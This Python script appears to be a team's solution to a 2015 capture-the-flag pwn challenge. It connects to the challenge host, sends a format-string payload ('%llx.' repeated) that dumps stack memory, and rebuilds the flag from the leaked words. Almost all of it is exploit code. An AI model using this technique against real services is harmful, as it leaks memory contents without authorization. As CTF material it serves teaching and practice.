#!/usr/bin/python
#
# Backdoor CTF 2015
# TEAM (PWN/600)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

from pwn import *
from struct import pack, unpack

# Split into blocks
def split_blocks(b, block_size):
  return [b[i:i+block_size] for i in range(0, len(b), block_size)]

# Reverse order (take block size into account)
def rev(b, block_size):
  blocks = split_blocks(b, block_size)
  return "".join(blocks[::-1])

host = 'hack.bckdr.in'
h = remote(host, 8004, timeout = None)
print h.recvuntil('Enter teamname: ')
# Send format string exploit (dump 30 8-byte words from stack)
h.send("%llx." * 30 + "\n")
print h.recvuntil('Enter flag: ')
h.send("blaat\n")
msg = h.recvall()
print msg
h.close()

# Split stack words
msg = msg.split(".")

# Chop flag into correct representation
blocks = [msg[4][0:8]]

for part in msg[5: 12]:
  blocks.append(part)

blocks.append(msg[12][7:])

hsh = ""
for block in blocks:
  hsh += rev(block, 2)

print "[+]Got flag: [%s]" % hsh